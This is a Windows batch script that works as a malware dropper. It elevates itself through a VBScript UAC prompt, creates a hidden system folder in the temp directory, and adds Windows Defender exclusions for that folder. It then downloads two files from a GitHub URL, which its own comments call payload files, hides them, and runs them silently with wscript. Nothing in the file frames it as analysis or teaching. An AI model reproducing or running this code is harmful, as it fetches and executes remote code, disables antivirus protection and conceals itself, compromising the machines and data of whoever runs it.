@echo off
setlocal

REM Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% EQU 0 (
    goto :run_as_admin
    goto :end
) else (
    goto :elevate
)

:elevate
REM Use VBScript to elevate privileges
set "batchPath=%~0"
set "vbsGetPrivileges=%temp%\OEgetPriv_%random%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^)>"%vbsGetPrivileges%"
echo UAC.ShellExecute "%batchPath%", "", "", "runas", 1 >>"%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
del "%vbsGetPrivileges%" /f /q
goto :end

:run_as_admin

REM Create hidden and random folder
set "hiddenFolder1=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
mkdir "%hiddenFolder1%"

REM Set hidden attribute for folder

attrib +h +s "%hiddenFolder1%"

cd %hiddenFolder1%

REM Add setup.bat to Windows Defender's exclusion list
powershell -Command "Add-MpPreference -ExclusionProcess '%hiddenFolder1%\setup.bat'"
REM Exclude hidden folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder1%\myscript.vbs'"

:: myscript
curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder1%\myscript.vbs"

attrib +h +s "%hiddenFolder1%\myscript.vbs"

set "thetime=%time%"

REM Download payload files to hidden folder using curl
curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/setup.bat -o "%hiddenFolder1%\setup.bat"
REM Set hidden attribute for file

attrib +h +s "%hiddenFolder1%\setup.bat"

REM Run payload silently and pass %hiddenFolder% variable
start /B wscript.exe myscript.vbs setup.bat
goto :eof

:end
REM End of script
